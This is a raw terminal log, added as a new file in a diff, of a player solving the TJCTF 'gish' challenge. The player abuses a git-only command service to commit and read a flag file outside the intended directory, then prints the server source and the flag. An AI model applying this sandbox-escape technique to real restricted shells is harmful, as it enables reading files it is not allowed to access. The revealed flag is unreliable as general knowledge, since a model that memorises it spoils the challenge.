@@ -1,0 +1,273 @@
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git status
+
+end
+script entered
+On branch master
+
+No commits yet
+
+Untracked files:
+  (use "git add <file>..." to include in what will be committed)
+        ../bin
+        ../dev/
+        ../etc/
+        ../flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt
+        ../lib
+        ../lib32
+        ../lib64
+        ../libx32
+        ../proc/
+        ../root/
+        ../run/
+        ../sbin
+        ./
+        ../sys/
+        ../tini
+        ../usr/
+        ../var/
+
+nothing added to commit but untracked files present (use "git add" to track)
+
+errored, exiting
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git config --global user.name "giovixo97"
+git config --global user.email "giovixo97@gmail.com"
+end
+script entered
+
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git add .
+git commit -m "ciao"
+end
+script entered
+
+[master (root-commit) 498cf23] ciao
+ 1 file changed, 27 insertions(+)
+ create mode 100755 srv/run.py
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git ls-tree
+git ls-files
+end
+script entered
+usage: git ls-tree [<options>] <tree-ish> [<path>...]
+
+    -d                    only show trees
+    -r                    recurse into subtrees
+    -t                    show trees when recursing
+    -z                    terminate entries with NUL byte
+    -l, --long            include object size
+    --name-only           list only filenames
+    --name-status         list only filenames
+    --full-name           use full path names
+    --full-tree           list entire tree; not just current directory (implies --full-name)
+    --abbrev[=<n>]        use <n> digits to display object names
+
+errored, exiting
+run.py
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+gif diff
+end
+script entered
+errored, exiting
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git diff run.py ../flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt
+end
+script entered
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git log
+end
+script entered
+commit 498cf23451df62d92d146eb7b285182fab9863f6
+Author: giovixo97 <giovixo97@gmail.com>
+Date:   Fri May 26 18:16:28 2023 +0000
+
+    ciao
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git show 498cf234:../flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt
+end
+script entered
+fatal: path 'flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt' exists on disk, but not in '498cf234'
+errored, exiting
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git show 498cf234
+end
+script entered
+commit 498cf23451df62d92d146eb7b285182fab9863f6
+Author: giovixo97 <giovixo97@gmail.com>
+Date:   Fri May 26 18:16:28 2023 +0000
+
+    ciao
+
+diff --git a/srv/run.py b/srv/run.py
+new file mode 100755
+index 0000000..095b949
+--- /dev/null
++++ b/srv/run.py
+@@ -0,0 +1,27 @@
++#!/usr/bin/python3
++import sys
++import shlex
++import subprocess
++from os import chdir
++
++chdir('/srv/')
++print('please enter your script, terminated by the word "end"')
++sys.stdout.flush()
++script_lines = []
++
++while True:
++  next_line = sys.stdin.readline().strip()
++  if next_line == 'end':
++    break
++  script_lines.append(next_line)
++print('script entered')
++sys.stdout.flush()
++for line in script_lines:
++  try:
++    args = shlex.split(line)
++    assert args[0] == 'git'
++    output = subprocess.check_output(args, timeout=10)
++    print(output.decode('utf-8'))
++  except:
++    print('errored, exiting')
++  sys.stdout.flush()
+\ No newline at end of file
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git add ../flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt
+end
+script entered
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git commit -m "zio"
+end
+script entered
+[master bc83b41] zio
+ 1 file changed, 1 insertion(+)
+ create mode 100644 flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git show 498cf234
+end
+script entered
+commit 498cf23451df62d92d146eb7b285182fab9863f6
+Author: giovixo97 <giovixo97@gmail.com>
+Date:   Fri May 26 18:16:28 2023 +0000
+
+    ciao
+
+diff --git a/srv/run.py b/srv/run.py
+new file mode 100755
+index 0000000..095b949
+--- /dev/null
++++ b/srv/run.py
+@@ -0,0 +1,27 @@
++#!/usr/bin/python3
++import sys
++import shlex
++import subprocess
++from os import chdir
++
++chdir('/srv/')
++print('please enter your script, terminated by the word "end"')
++sys.stdout.flush()
++script_lines = []
++
++while True:
++  next_line = sys.stdin.readline().strip()
++  if next_line == 'end':
++    break
++  script_lines.append(next_line)
++print('script entered')
++sys.stdout.flush()
++for line in script_lines:
++  try:
++    args = shlex.split(line)
++    assert args[0] == 'git'
++    output = subprocess.check_output(args, timeout=10)
++    print(output.decode('utf-8'))
++  except:
++    print('errored, exiting')
++  sys.stdout.flush()
+\ No newline at end of file
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git log
+end
+script entered
+commit bc83b41a54a16f3335c6bad6a8f4978586361060
+Author: giovixo97 <giovixo97@gmail.com>
+Date:   Fri May 26 18:21:03 2023 +0000
+
+    zio
+
+commit 498cf23451df62d92d146eb7b285182fab9863f6
+Author: giovixo97 <giovixo97@gmail.com>
+Date:   Fri May 26 18:16:28 2023 +0000
+
+    ciao
+
+
+┌──(giovixo97㉿GiovanniWin10)-[~]
+└─$ openssl s_client -quiet -verify_quiet -connect gish-e60a815ec8342f00.tjc.tf:1337
+please enter your script, terminated by the word "end"
+git show  bc83b41a54
+end
+script entered
+commit bc83b41a54a16f3335c6bad6a8f4978586361060
+Author: giovixo97 <giovixo97@gmail.com>
+Date:   Fri May 26 18:21:03 2023 +0000
+
+    zio
+
+diff --git a/flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt b/flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt
+new file mode 100644
+index 0000000..031c4a1
+--- /dev/null
++++ b/flag-4c3a88e1-1f79-40d7-957b-3a1cc58ae67f.txt
+@@ -0,0 +1 @@
++tjctf{uncontrolled_versions_1831821a}
